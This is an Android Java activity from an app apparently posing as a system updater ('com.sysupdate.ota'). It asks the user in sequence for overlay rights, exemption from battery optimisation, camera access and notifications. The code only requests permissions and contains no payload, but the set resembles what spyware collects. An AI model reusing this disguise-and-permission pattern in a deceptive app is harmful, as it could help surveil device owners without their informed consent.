package com.sysupdate.ota;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

public class PermissionActivity extends Activity {
    private static final String TAG = "sysupdate.perm";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.i(TAG, "PermissionActivity launched");
        requestNext();
    }

    private void requestNext() {
        // Step 1: Overlay permission — open Settings (works from ANY context)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Log.i(TAG, "opening overlay settings");
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            try {
                startActivity(i);
            } catch (Exception e) {
                Log.e(TAG, "overlay settings failed: " + e.getMessage());
            }
            // Check again after user returns
            return;
        }

        // Step 2: Battery optimization — open Settings
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Log.i(TAG, "opening battery settings");
                try {
                    Intent i = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                    startActivity(i);
                } catch (Exception e) {
                    Log.e(TAG, "battery settings failed: " + e.getMessage());
                }
                return;
            }
        }

        // Step 3: Camera permission — system popup
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.i(TAG, "requesting camera permission");
            requestPermissions(new String[]{ Manifest.permission.CAMERA }, 100);
            return;
        }

        // Step 4: Notification permission (Android 13+) — system popup
        if (Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            Log.i(TAG, "requesting notification permission");
            requestPermissions(new String[]{ Manifest.permission.POST_NOTIFICATIONS }, 101);
            return;
        }

        // All done
        Log.i(TAG, "all permissions handled");
        finish();
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Re-check after returning from Settings
        getWindow().getDecorView().postDelayed(this::requestNext, 300);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        requestNext();
    }
}
